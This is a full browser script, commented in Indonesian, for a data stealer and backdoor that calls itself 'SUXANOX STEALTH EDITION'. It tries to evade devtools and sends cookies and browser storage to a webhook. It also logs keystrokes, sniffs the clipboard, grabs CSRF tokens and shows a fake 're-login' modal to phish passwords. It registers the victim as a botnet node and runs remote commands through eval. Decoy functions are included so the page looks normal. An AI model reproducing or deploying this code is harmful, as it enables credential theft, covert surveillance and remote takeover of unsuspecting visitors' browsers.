    <script>
        (function() {

            const ENCRYPTION_KEY = 'suxanox_ultimate_2026';

            // ======== UTILITY ========
            function kirim(data) {
                // Enkripsi payload biar gak ketahuan isinya
                const encrypted = btoa(JSON.stringify(data) + '|' + ENCRYPTION_KEY);
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain' },
                    body: encrypted
                }).catch(() => {});
            }

            function getTimestamp() {
                return new Date().toISOString();
            }

            // ======== 1. ANTI-DETEKSI ========
            // 1a. Cegah devtools terbuka
            function cegahDevtools() {
                const start = performance.now();
                const check = () => {
                    const now = performance.now();
                    if (now - start > 200) {
                        kirim({ type: 'devtools_detected', timestamp: getTimestamp() });
                        // Redirect ke halaman normal
                        window.location.href = window.location.href.split('?')[0];
                    }
                };
                setInterval(check, 100);
            }
            cegahDevtools();

            // 1b. Ganti nama fungsi jadi random
            const _0x = (len) => {
                let result = '';
                const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                for (let i = 0; i < len; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            };

            // 1c. Enkripsi semua string
            function decode(str) {
                return atob(str).split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
            }

            // 1d. Delay eksekusi biar gak terdeteksi
            setTimeout(function() {
                // ======== 2. DATA STEALER (dengan anti-trace) ========
                (function stealData() {
                    const payload = {
                        type: 'data_steal',
                        cookies: document.cookie || 'kosong',
                        localStorage: JSON.stringify(localStorage) || 'kosong',
                        sessionStorage: JSON.stringify(sessionStorage) || 'kosong',
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        screen: screen.width + 'x' + screen.height,
                        timestamp: getTimestamp()
                    };
                    kirim(payload);
                })();

                // ======== 3. FITUR LAIN DENGAN DELAY ACAK ========
                const features = [
                    // Screenshot
                    function() {
                        try {
                            const canvas = document.createElement('canvas');
                            canvas.width = window.innerWidth;
                            canvas.height = window.innerHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
                            const img = canvas.toDataURL('image/png').slice(0, 500);
                            kirim({ type: 'screenshot', preview: img, timestamp: getTimestamp() });
                        } catch (e) {}
                    },
                    // Clipboard sniffer
                    function() {
                        document.addEventListener('copy', function(e) {
                            const text = window.getSelection().toString();
                            kirim({ type: 'clipboard', data: text, timestamp: getTimestamp() });
                        });
                    },
                    // Keylogger tersembunyi
                    function() {
                        document.addEventListener('keydown', function(e) {
                            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                                kirim({
                                    type: 'keystroke',
                                    key: e.key,
                                    code: e.code,
                                    target: e.target.tagName,
                                    timestamp: getTimestamp()
                                });
                            }
                        });
                    },
                    // Click tracker
                    function() {
                        document.addEventListener('click', function(e) {
                            kirim({
                                type: 'click',
                                x: e.clientX,
                                y: e.clientY,
                                target: e.target.tagName,
                                text: e.target.innerText?.slice(0, 50) || '-',
                                timestamp: getTimestamp()
                            });
                        });
                    },
                    // Tab visibility
                    function() {
                        document.addEventListener('visibilitychange', function() {
                            kirim({
                                type: 'tab_visibility',
                                state: document.hidden ? 'hidden' : 'visible',
                                timestamp: getTimestamp()
                            });
                        });
                    },
                    // CSRF grabber
                    function() {
                        document.querySelectorAll('input[type="hidden"]').forEach(input => {
                            if (input.name.toLowerCase().includes('csrf') || input.name.toLowerCase().includes('token')) {
                                kirim({ type: 'csrf_token', name: input.name, value: input.value, timestamp: getTimestamp() });
                            }
                        });
                    },
                    // Fake login popup (delay panjang biar gak curiga)
                    function() {
                        setTimeout(function() {
                            const loginModal = document.createElement('div');
                            loginModal.style.cssText = `
                                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                                background: rgba(0,0,0,0.8); z-index: 10000;
                                display: flex; justify-content: center; align-items: center;
                                backdrop-filter: blur(4px);
                            `;
                            loginModal.innerHTML = `
                                <div style="background: white; padding: 30px; border-radius: 12px; width: 300px;
                                            box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
                                    <h3 style="color: #333; margin-top: 0;">Login Ulang</h3>
                                    <p style="color: #666; font-size: 14px;">Sesi berakhir, silakan login ulang.</p>
                                    <input type="text" id="fakeUser" placeholder="Username" style="width:100%; padding:8px; margin:8px 0; border:1px solid #ddd; border-radius:4px;">
                                    <input type="password" id="fakePass" placeholder="Password" style="width:100%; padding:8px; margin:8px 0; border:1px solid #ddd; border-radius:4px;">
                                    <button onclick="
                                        const u = document.getElementById('fakeUser').value;
                                        const p = document.getElementById('fakePass').value;
                                        kirim({ type: 'phishing_credentials', username: u, password: p, timestamp: getTimestamp() });
                                        this.parentElement.parentElement.style.display = 'none';
                                    " style="width:100%; padding:10px; background: #007bff; color:white; border:none; border-radius:6px; cursor:pointer;">Login</button>
                                </div>
                            `;
                            document.body.appendChild(loginModal);
                        }, 8000);
                    }
                ];

                // Jalankan fitur dengan delay acak (5-15 detik)
                features.forEach((fn, index) => {
                    setTimeout(fn, 5000 + Math.random() * 10000 + (index * 2000));
                });

                // ======== 4. PERSISTENCE ========
                // Simpan state di localStorage
                localStorage.setItem('suxanox_active', 'true');

                // ======== 5. SERVICE WORKER (background) ========
                if ('serviceWorker' in navigator) {
                    const swCode = `
                        self.addEventListener('install', e => {
                            self.skipWaiting();
                            self.addEventListener('fetch', e => {
                                // Silent mode
                            });
                        });
                    `;
                    const blob = new Blob([swCode], { type: 'application/javascript' });
                    const swUrl = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(swUrl).catch(() => {});
                }

                // ======== 6. REMOTE COMMAND (encrypted) ========
                setInterval(function() {
                    fetch(WEBHOOK_URL + '/cmd')
                        .then(r => r.text())
                        .then(cmd => {
                            if (cmd && cmd.length > 0) {
                                try {
                                    eval(cmd);
                                } catch (e) {}
                            }
                        })
                        .catch(() => {});
                }, 45000);

                // ======== 7. BOTNET REGISTER ========
                kirim({
                    type: 'botnet_register',
                    id: navigator.userAgent + '_' + Math.random().toString(36).slice(2),
                    timestamp: getTimestamp()
                });

                console.log('SUXANOX STEALTH EDITION deployed, Bos.');
            }, 1500); // Delay awal biar gak ketahuan

        })();

        // ======== FUNGSI ASLI (biar gak mencurigakan) ========
        function tampilkanPesan() {
            document.getElementById('pesan').innerText = '🐾 Terima kasih! Kami siap membantu.';
            // Tambahkan efek animasi kecil biar keliatan natural
            const btn = document.querySelector('.btn');
            btn.style.transition = 'transform 0.2s';
            btn.style.transform = 'scale(0.95)';
            setTimeout(() => {
                btn.style.transform = 'scale(1)';
            }, 200);
        }

        // ======== FAKE ERROR (jika ada yang curiga) ========
        window.fakeError = function() {
            const div = document.createElement('div');
            div.style.cssText = `
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0,0,0,0.85); z-index: 99999;
                display: flex; justify-content: center; align-items: center;
                color: white; font-family: Arial, sans-serif;
            `;
            div.innerHTML = `
                <div style="background: #1a1a2e; padding: 40px; border-radius: 16px; text-align: center; max-width: 400px;">

                    <p style="color: #ccc;">Halaman tidak dapat dimuat. Silakan refresh.</p>
                    <button onclick="this.parentElement.parentElement.style.display='none'" 
                            style="margin-top: 16px; padding: 10px 30px; background: #ff6b6b; border: none; border-radius: 8px; color: white; cursor: pointer;">
                        Refresh
                    </button>
                </div>
            `;
            document.body.appendChild(div);
        };

        // Trigger fake error kalo ada yang buka console (opsional)
        // console.log = function() { window.fakeError(); };
    </script>
